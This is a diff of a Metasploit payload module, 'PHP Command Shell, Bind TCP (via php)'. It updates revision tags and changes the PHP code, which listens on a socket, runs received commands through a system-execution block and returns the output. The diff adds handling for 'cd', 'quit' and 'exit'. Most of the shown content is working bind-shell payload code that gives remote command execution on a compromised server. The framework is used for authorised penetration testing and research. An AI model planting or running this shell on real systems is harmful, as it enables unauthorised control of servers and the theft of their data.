@@ -1,5 +1,5 @@
 ##
-# $Id: bind_php.rb 6491 2009-04-18 23:51:20Z egypt $
+# $Id: bind_php.rb 7027 2009-09-10 06:19:10Z egypt $
 ##
 
 ##
@@ -24,7 +24,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
-			'Version'       => '$Revision: 6491 $',
+			'Version'       => '$Revision: 7027 $',
 			'Description'   => 'Listen for a connection and spawn a command shell via php',
 			'Author'        => ['egypt', 'diaul <diaul@devilopers.org>',],
 			'License'       => BSD_LICENSE,
@@ -64,10 +64,16 @@ module Metasploit3
 
 		while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
 		{
-			
+			$o = '';
 			$c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
 			if(FALSE===$c){break;}
-			#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+			if(substr($c,0,3) == 'cd '){
+				chdir(substr($c,3,-1));
+			} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+				break;
+			}else{
+				#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+			}
 			@socket_write($msgsock,$o,strlen($o));
 		}
 		@socket_close($msgsock);
